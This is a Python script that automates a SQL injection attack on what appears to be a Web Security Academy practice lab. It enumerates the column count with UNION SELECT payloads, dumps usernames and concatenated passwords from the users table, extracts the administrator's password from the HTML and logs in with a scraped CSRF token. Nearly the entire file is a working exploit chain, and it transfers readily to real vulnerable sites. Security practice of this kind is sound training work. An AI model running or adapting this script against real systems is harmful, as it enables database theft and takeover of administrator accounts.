import requests
from typing import Optional

session = requests.Session()

BASE_URL="https://0aab00b20350e7358211f62f00670087.web-security-academy.net"
FILTER_URL=BASE_URL+"/filter"
LOGIN_URL=BASE_URL+"/login"

def payload_request(payload:str) ->requests.Response:
    
    params={
        "category":payload
    }
    response = session.get(FILTER_URL,params=params, timeout=10)
    print(f"{response.status_code} {payload}")
    return response

def find_column_len()->int:
    for num in range(1,10):
        payload = f"' union select {",".join(["NULL"]*num)}-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return num

def find_user_request(column_len:int)->requests.Response:
    
    for num in range(0, column_len):
        arrs = ["NULL"] * column_len
        arrs[num] = "username || password"
        payload = f"' union select {",".join(arrs)} from users-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return response

def extract_value_by_keyword(html: str, keyword: str) -> str | None:
    """
    從 HTML 中找到以 keyword 開頭的 <td> 文字，並去掉標籤。
    
    :param html: HTML 字串
    :param keyword: 要搜尋的關鍵字，例如 "PASSWORD"
    :return: 找到的文字，沒找到回傳 None
    """
    import re
    pattern = fr">(\s*{re.escape(keyword)}[^<]*)<"
    match = re.search(pattern, html)
    if match:
        print(f"{keyword}: {match.group(1).strip()}")
        return match.group(1).strip()
    return None

def find_csrf()->str:
    response = session.get(LOGIN_URL, timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    return csrf_input.get("value")

def login(pw:str):
    data={
        "csrf":find_csrf(),
        "username":"administrator",
        "password":pw
    }
    response = session.post(LOGIN_URL, data=data, timeout=10)
    if "Your username is: administrator" in response.text:
        print("login success")

def main():
    payload_request("Gifts")
    payload_request("' or 1=1-- ")
    column_len = find_column_len()
    response = find_user_request(column_len=column_len)
    admin_and_pw = extract_value_by_keyword(response.text,"administrator")
    pw = admin_and_pw[len("administrator"):]
    login(pw)

    

if __name__=="__main__":
    main()